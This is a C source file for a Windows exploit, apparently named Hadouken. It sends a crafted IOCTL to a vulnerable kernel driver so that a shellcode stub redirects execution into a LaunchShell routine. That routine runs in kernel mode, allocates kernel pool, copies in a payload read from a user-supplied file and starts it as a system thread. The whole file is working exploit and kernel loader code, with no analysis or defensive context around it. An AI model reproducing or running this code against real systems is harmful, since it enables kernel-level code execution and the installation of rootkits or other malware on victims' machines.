#include "Hadouken.h"

DWORD gBufSize;
LPVOID gBuffer;
DECLARE_UNICODE_STRING(strAlloc, L"ExAllocatePoolWithTag");
DECLARE_UNICODE_STRING(strThread, L"PsCreateSystemThread");

#pragma const_seg(push, stack1, ".text")
const PAYLOAD payload = { &payload.shellcode , 0xb848, LaunchShell, 0xe0ff};
#pragma const_seg(pop, stack1)

VOID LaunchShell(LPVOID arg)
{
	_enable();
	HANDLE hThread;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	MMGETSYSTEMROUTINEADDRESS MmGetSystemRoutineAddress = (MMGETSYSTEMROUTINEADDRESS)arg;
	if (MmGetSystemRoutineAddress) {
		EXALLOCATEPOOLWITHTAG ExAllocatePoolWithTag = (EXALLOCATEPOOLWITHTAG)MmGetSystemRoutineAddress(&strAlloc);
		if (ExAllocatePoolWithTag) {
			PSCREATESYSTEMTHREAD PsCreateSystemThread = (PSCREATESYSTEMTHREAD)MmGetSystemRoutineAddress(&strThread);
			if (PsCreateSystemThread) {
				PUCHAR kbuf = (PUCHAR)ExAllocatePoolWithTag(0, gBufSize, 0x6D756C50);
				if (kbuf) {
					__movsq((__int64*)kbuf, (__int64*)gBuffer, gBufSize / sizeof(__int64));
					if (0 == PsCreateSystemThread(&hThread, GENERIC_ALL, &oa, NULL, NULL, kbuf + 0x400, MmGetSystemRoutineAddress)) {
						//TODO: ZwClose(hThread);	
					} else {
						//TODO: ExFreePoolWithTag(gBufSize, 0x6D756C50);
					}
				}
			}
		}
	}
}

int wmain(int argc, wchar_t *argv[], wchar_t *envp[])
{
	HANDLE hFile, hDevice;
	DWORD outBuf, dummy;
	LPVOID inbuf = &payload.shellcode;
	
	hFile = CreateFile(argv[1], GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE != hFile) {
		gBufSize = GetFileSize(hFile, NULL);
		gBuffer = LocalAlloc(0, gBufSize);
		if (NULL != gBuffer) {
			if (ReadFile(hFile, gBuffer, gBufSize, &dummy, NULL)) {
				hDevice = CreateFile(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				if (INVALID_HANDLE_VALUE != hDevice) {
					if (DeviceIoControl(hDevice, IOCTL_EXPLOIT64, &inbuf, sizeof(inbuf), &outBuf, sizeof(DWORD), &dummy, NULL)){
						printf("Exploit message sent successfully!\n");
					}
					else printf("Unable to send command to driver (%d)\n", GetLastError());
					CloseHandle(hDevice);
				}
				else printf("Could not open device %s (%d)\n", DEVICE_NAME, GetLastError());
			}
			else printf("Error reading file (%d)\n", GetLastError());
		}
		else printf("Unable to allocate %d bytes (%d)\n", gBufSize, GetLastError());
		CloseHandle(hFile);
	}
	else printf("Could not open %s (%d)\n", argv[1], GetLastError());
	return 0;
}